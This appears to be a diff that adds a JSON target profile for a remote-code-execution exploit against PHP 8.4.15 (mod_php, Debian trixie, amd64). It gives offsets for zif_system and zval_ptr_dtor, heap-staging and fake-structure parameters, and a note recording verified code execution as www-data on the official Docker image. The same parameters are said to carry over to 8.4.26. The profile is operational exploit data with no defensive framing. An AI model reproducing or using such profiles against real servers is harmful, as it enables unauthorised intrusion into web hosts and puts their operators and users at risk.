@@ -1,0 +1,25 @@
+{
+  "name": "php-8.4.15-trixie-amd64",
+  "php_version": "8.4.15",
+  "os": "debian-trixie",
+  "arch": "amd64",
+  "sapi": "mod_php",
+  "offsets": {
+    "zif_system": "0x445F70",
+    "zval_ptr_dtor": "0x63D420"
+  },
+  "stages": {
+    "a1_big": 78,
+    "a2_parts": 880,
+    "a2_depth": 64,
+    "a2_fillers": 115,
+    "leak_fake_len": "0xC8000",
+    "forge_vl": 384,
+    "forge_n1": 500,
+    "forge_n2": 495,
+    "ht_offset": "0xF8398"
+  },
+  "memory_limit": "128M",
+  "status": "verified",
+  "notes": "Official php:8.4.15-apache Docker image, Debian trixie. Offsets read from the image's own libphp.so. Verified RCE 2026-10-23: try 1, candidate 1, uid=33(www-data). ht_offset and staging params are identical to 8.4.26 - the heap layout after A1 did not change between these builds."
+}
